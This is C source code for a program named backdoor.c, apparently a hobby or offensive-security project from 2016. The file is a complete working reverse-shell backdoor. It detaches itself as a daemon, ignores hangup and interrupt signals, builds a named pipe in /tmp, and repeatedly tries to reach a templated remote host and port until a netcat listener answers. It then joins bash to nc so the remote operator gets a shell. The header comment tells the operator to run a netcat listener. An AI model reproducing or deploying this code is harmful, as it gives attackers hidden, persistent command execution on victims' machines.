//
//  backdoor.c
//  Run nc -kl 4321 on the server.
//
//  Created by Antonio Frighetto on 11/06/16.
//  Copyright © 2016 Antonio Frighetto. All rights reserved.
//

#include <arpa/inet.h>
#include <assert.h>
#include <fcntl.h>
#include <netdb.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <syslog.h>
#include <unistd.h>

#define HOSTNAME "$hostname"
#define PORT "$port"

#define DEBUG 0
#define LOG(level, message, ...) do { if (DEBUG) syslog(level, message, ##__VA_ARGS__); } while(0)

int main(int argc, const char * argv[]) {
    pid_t pid;
    struct sigaction sa;
    const char* filename = "/tmp/backpipe";
    int bkp;
    int pipefd[2];
    
    umask(0);
    if ((pid = fork()) < 0) {
        fprintf(stderr, "[-] could not fork()...\n");
        exit(1);
    } else if (pid > 0)
        exit(0);
    setsid();
    sa.sa_handler = SIG_IGN;
    if (!(sigemptyset(&sa.sa_mask))) {
        sigaction(SIGHUP, &sa, NULL);
        sigaction(SIGINT, &sa, NULL);
    }
    chdir("/");
    int fds = (int)sysconf(_SC_OPEN_MAX);
    while (fds--)
        close(fds);
    
    open("/dev/null", O_RDONLY);
    open("/dev/null", O_RDWR);
    open("/dev/null", O_RDWR);
    
#if DEBUG
    openlog(argv[0], LOG_CONS | LOG_PID, LOG_DAEMON);
#endif
    
createfifo:
    if (mkfifo(filename, 0666) < 0) {
        struct stat fs;
        if (!(stat(filename, &fs)) && (fs.st_mode & S_IFMT) == S_IFIFO) {
            LOG(LOG_WARNING, "[i] backpipe fifo already exists...\n");
        } else {
            assert(remove(filename) != -1);
            goto createfifo;
        }
    } else {
        LOG(LOG_INFO, "[+] backpipe created.\n");
    }
    
    if ((bkp = open("/tmp/backpipe", O_RDWR | O_TRUNC)) < 0) {
        LOG(LOG_ERR,"[-] could not r/w the backpipe, exiting...\n");
        exit(1);
    }
    
    struct hostent* he;
    struct sockaddr_in server_addr;
    if (!(he = gethostbyname(HOSTNAME))) {
        LOG(LOG_ERR, "[-] could not reach the server, exiting...\n");
        exit(1);
    }
    memset(&server_addr, 0, sizeof(struct sockaddr_in));
    server_addr.sin_port = htons(atoi(PORT));
    server_addr.sin_addr.s_addr = *(unsigned long*)he->h_addr_list[0];
    
    while (1) {
        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        assert(sockfd != -1);
        if (!(connect(sockfd, (struct sockaddr*)&server_addr, sizeof(struct sockaddr_in)))) {
            close(sockfd);
            break;
        }
        LOG(LOG_WARNING, "[i] waiting for listener...\n");
        close(sockfd);
        usleep(2000);
    }
    LOG(LOG_INFO, "[+] connecting to %s via port %s...\n", inet_ntoa(server_addr.sin_addr), PORT);
    
    pipe(pipefd);
    
#if DEBUG
    closelog();
#endif
    
    if (!(pid = fork())) {
        close(pipefd[0]);
        dup2(bkp, STDIN_FILENO);
        close(bkp);
        dup2(pipefd[1], STDOUT_FILENO);
        close(pipefd[1]);
        execl("/usr/bin/nc", "nc", HOSTNAME, PORT, NULL);
    } else if (pid > 0) {
        close(pipefd[1]);
        dup2(bkp, STDOUT_FILENO);
        close(bkp);
        dup2(pipefd[0], STDIN_FILENO);
        close(pipefd[0]);
        execl("/bin/bash", "bash", NULL);
    } else {
        exit(1);
    }
}
